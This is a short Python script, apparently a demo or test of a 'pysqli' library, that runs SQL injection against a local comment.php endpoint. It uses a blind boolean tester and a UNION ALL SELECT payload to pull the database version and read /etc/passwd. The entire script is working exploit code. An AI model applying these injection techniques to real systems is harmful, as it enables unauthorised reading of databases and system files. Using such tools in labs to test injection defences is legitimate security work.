#! /usr/bin/python3

import requests

from pysqli import SqliEncoder
from pysqli.blind_tester import BlindTester
from pysqli.blind_string_finder import BlindStringFinder
from pysqli.star_extract import StarExtract
from pysqli.union_string_finder import UnionStringFinder

rb = lambda payload : requests.get('http://127.0.0.1:8181/comment.php', params={'id': '1 {}'.format(payload), 'log': '1'})

tester = BlindTester(
    lambda payload : requests.get('http://127.0.0.1:8181/comment.php', params={'id': '1 {}'.format(payload), 'log': '1'}),
    lambda r: 'admin' in r.text)

sf = BlindStringFinder(tester)

sf.read_string("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou')))
print(sf.read_file('/etc/passwd'))

print(sf.read_string("(SELECT version())"))

print('-' * 15 + 'Find by union' + '-' * 15)

usf = UnionStringFinder('AND 1=0 UNION ALL SELECT 1,2,{}', rb, StarExtract('<h2>2</h2><p>*</p>'))

print(usf.read_string('(SELECT version())'))

print(usf.read_file('/etc/passwd'))

